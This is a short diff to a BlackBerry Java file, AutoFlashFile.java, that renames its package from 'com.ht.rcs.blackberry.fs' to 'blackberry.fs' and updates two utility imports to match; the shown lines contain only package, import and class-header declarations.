@@ -5,7 +5,7 @@
  * File         : AutoFlashFile.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.fs;
+package blackberry.fs;
 
 import java.io.DataInputStream;
 import java.io.IOException;
@@ -17,8 +17,8 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.io.IOUtilities;
 
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.utils.Check;
+import blackberry.utils.Utils;
 
 public class AutoFlashFile {
     String filename;
